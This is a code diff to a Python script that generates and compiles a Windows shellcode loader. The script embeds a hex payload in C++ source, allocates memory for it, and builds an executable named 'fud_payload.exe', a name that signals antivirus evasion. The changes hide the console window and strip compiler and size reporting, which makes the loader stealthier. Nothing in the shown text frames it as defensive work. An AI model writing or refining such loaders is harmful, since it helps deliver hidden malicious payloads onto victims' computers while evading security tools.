@@ -9,10 +9,11 @@ def build_loader(payload_path):
 
     cpp_source = f"""
 #include <windows.h>
-extern "C" void* SyscallStub(void* addr, SIZE_T size);
+
+unsigned char payload[] = {{ {hex_payload} }};
 
 int main() {{
-    unsigned char payload[] = {{ {hex_payload} }};
+    ShowWindow(GetConsoleWindow(), SW_HIDE);
     SIZE_T sz = sizeof(payload);
     LPVOID mem = VirtualAlloc(NULL, sz, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
     unsigned char* p = static_cast<unsigned char*>(mem);
@@ -26,10 +27,7 @@ int main() {{
 """
     with open("loader.cpp", "w") as f: f.write(cpp_source)
     
-    # Compilation with explicit size reporting
     cmd = ["x86_64-w64-mingw32-g++", "loader.cpp", "-o", "fud_payload.exe", "-Os", "-s", "-static", "-mwindows"]
-    result = subprocess.run(cmd, capture_output=True, text=True)
-    print(f"Compiler Output:\n{result.stderr}")
-    print(f"Binary Size: {os.path.getsize('fud_payload.exe')} bytes")
+    subprocess.run(cmd, check=True)
 
 if __name__ == "__main__": build_loader(sys.argv[1])
